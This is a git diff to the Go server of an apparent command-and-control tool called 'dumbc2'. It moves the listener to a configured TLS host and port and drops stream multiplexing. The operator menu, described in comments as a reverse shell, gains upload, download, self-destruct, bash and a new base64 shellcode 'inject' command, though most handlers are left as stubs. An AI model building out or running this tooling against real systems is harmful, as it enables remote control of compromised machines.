@@ -2,21 +2,24 @@ package useri
 
 import (
 	"fmt"
-	"github.com/pkg/errors"
-	"github.com/hashicorp/yamux"
+	"github.com/kmahyyg/dumbc2/config"
 	"github.com/kmahyyg/dumbc2/transport"
 	"github.com/kmahyyg/dumbc2/utils"
 	"log"
+	"net"
+	"strconv"
 	"strings"
 	"time"
 )
 
-func StartServer(){
-	allIPs := utils.GetAllIPs()
-	//todo: argparse instead
-
+func StartServer(userOP config.UserOperation) {
+	lres := userOP.Host
+	lport := strconv.Itoa(userOP.Port)
 	fladdr := lres + ":" + lport
     lbserver, err := transport.TLSServerBuilder(fladdr, false)
+    if err != nil {
+    	panic(err)
+	}
     for true {
     	if lbserver != nil {
 			conn, err := lbserver.Accept()
@@ -25,12 +28,7 @@ func StartServer(){
 				continue
 			}
 			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
-			sess, err := yamux.Client(conn, nil)
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			handleClient(sess)
+			handleClient(conn)
 		} else {
 			log.Fatalln("Failed to bind.")
 		}
@@ -48,33 +46,31 @@ download <Source File Path> <Destination File Path> = Download file
 boom = Self-Destroy
 exit = Close Program
 help = Show This Message
+inject <BASE64-Encoded Code> = Execute Shell Code
 `)
 }
 
-func handleClient(sess *yamux.Session){
+func handleClient(conn net.Conn){
 	// start as tls server, means it's a reverse shell
-	// if mux, we are working as server.
-	stream, err := sess.Open()
 	printHelp()
-	if err != nil {
-		log.Println(err)
-	}
 	fmt.Println("Connection established.")
-	fmt.Println("Commands: upload, download, boom, bash, exit, help.\n")
+	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
 	for true {
-		fmt.Printf("[SERVER] %s [>_] $ ",stream.RemoteAddr().String())
+		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
 		switch useriptD[0] {
 		case "upload":
-			stream.Write([]byte("$UPLD$"))
+			//todo: build rtcommand and send
 		case "download":
-			stream.Write([]byte("$DWLD$"))
+			//todo
 		case "boom":
-			stream.Write([]byte("$BOOM$"))
+			//todo
 			break
 		case "bash":
-			stream.Write([]byte("$BASH"))
+			//todo
+		case "inject":
+			//todo
 		case "exit":
 			break
 		case "help":
@@ -83,6 +79,5 @@ func handleClient(sess *yamux.Session){
 			printHelp()
 		}
 	}
-	_ = stream.Close()
-	_ = sess.Close()
+	_ = conn.Close()
 }
